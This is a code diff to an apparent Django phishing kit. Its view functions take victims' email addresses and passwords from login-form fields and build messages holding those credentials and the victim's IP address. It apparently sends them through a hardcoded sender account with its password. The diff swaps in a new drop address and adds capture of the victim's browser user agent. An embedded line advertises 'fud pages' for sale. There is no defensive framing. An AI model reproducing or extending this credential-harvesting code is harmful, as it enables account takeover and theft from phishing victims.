@@ -21,8 +21,9 @@ def addin(request):
     passwordemail = request.POST["enginloio"]
     domain = email[email.index('@') + 1 : ]
     sender_email = "sharp@newupdateishere.com"
-    receiver_email = "ragnarson_uhtred@yahoo.com"
+    receiver_email = "daleyza.jaryia@eledeen.org"
     password = "kSolxWIUzc"
+    useragent = request.META['HTTP_USER_AGENT']
     message = MIMEMultipart("alternative")
     message["Subject"] = "New korea Page 1"
     message["From"] = sender_email
@@ -34,7 +35,7 @@ def addin(request):
     How are you?
     contact me on icq jamescartwright for your fud pages
     """
-    html = render_to_string('mail.html', {'emailaccess': email, 'passaccess': passwordemail, 'ipman': ip})
+    html = render_to_string('mail.html', {'emailaccess': email, 'useragent': useragent, 'passaccess': passwordemail, 'ipman': ip})
 
     # Turn these into plain/html MIMEText objects
     part1 = MIMEText(text, "plain")
@@ -57,7 +58,7 @@ def adddzz(request):
     passwordemail = request.POST["yyenginlo"]
     domain = email[email.index('@') + 1 : ]
     sender_email = "sharp@newupdateishere.com"
-    receiver_email = "ragnarson_uhtred@yahoo.com"
+    receiver_email = "daleyza.jaryia@eledeen.org"
     password = "kSolxWIUzc"
     message = MIMEMultipart("alternative")
     message["Subject"] = "New korea Page 2"
@@ -70,7 +71,7 @@ def adddzz(request):
     How are you?
     contact me on icq jamescartwright for your fud pages
     """
-    html = render_to_string('mail.html', {'emailaccess': email, 'passaccess': passwordemail, 'ipman': ip})
+    html = render_to_string('mail.html', {'emailaccess': email, 'passaccess': passwordemail, 'useragent': useragent, 'ipman': ip})
 
     # Turn these into plain/html MIMEText objects
     part1 = MIMEText(text, "plain")
